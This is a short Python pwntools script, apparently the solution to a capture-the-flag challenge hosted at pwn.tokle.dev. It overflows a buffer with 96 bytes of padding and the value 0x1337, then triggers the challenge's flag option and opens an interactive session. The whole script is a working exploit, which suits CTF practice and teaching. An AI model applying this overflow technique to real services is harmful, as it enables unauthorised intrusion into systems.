from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1338)

# Receive all the output text from the program
io.recvuntil(b"[Quit]")

# Choose "Fill buffer" option, and send padding + 0x1337 in bytes
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", b"A"*(32+64) + p32(0x1337))

# Trigger exploit to get flag
io.sendlineafter(b"> ", b"3")

io.interactive()
